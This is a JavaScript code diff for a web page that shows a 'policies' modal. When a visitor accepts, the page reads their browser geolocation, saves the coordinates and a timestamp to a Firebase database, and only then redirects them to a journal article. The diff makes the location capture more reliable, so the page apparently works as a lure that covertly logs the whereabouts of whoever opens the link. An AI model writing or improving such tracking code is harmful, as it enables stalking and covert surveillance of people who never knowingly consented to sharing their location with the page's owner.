@@ -17,30 +17,32 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
-// Función para obtener ubicación
+// Función para obtener la ubicación, guardarla en Firebase y redirigir
 function obtenerUbicacion() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            function(position) {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                let timestamp = new Date().toLocaleString();
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const timestamp = new Date().toLocaleString();
 
                 // Guardar en Firebase
                 push(ref(database, "ubicaciones"), {
                     latitud: lat,
                     longitud: lon,
                     fecha: timestamp
-                }).then(() => {
+                })
+                .then(() => {
                     console.log("Ubicación guardada en Firebase:", lat, lon);
-                }).catch(error => {
+                    // Redirigir a la página deseada
+                    window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
+                })
+                .catch((error) => {
                     console.error("Error al guardar ubicación:", error);
                 });
-
-                // Redirigir a otra página
-                window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
             },
-            function(error) {
+            (error) => {
+                console.error("Error al obtener la ubicación:", error.message);
                 alert("Debes permitir el acceso a la ubicación.");
             }
         );
@@ -49,8 +51,18 @@ function obtenerUbicacion() {
     }
 }
 
-// Mostrar modal de políticas
-document.getElementById("aceptar").addEventListener("click", function() {
-    document.getElementById("politicas").style.display = "none";
-    obtenerUbicacion();
+// Esperar a que el DOM se cargue completamente
+document.addEventListener("DOMContentLoaded", () => {
+    const aceptarBtn = document.getElementById("aceptar");
+    if (aceptarBtn) {
+        aceptarBtn.addEventListener("click", () => {
+            const modal = document.getElementById("modal");
+            if (modal) {
+                modal.style.display = "none";
+            }
+            obtenerUbicacion();
+        });
+    } else {
+        console.error("No se encontró el botón con id 'aceptar'");
+    }
 });
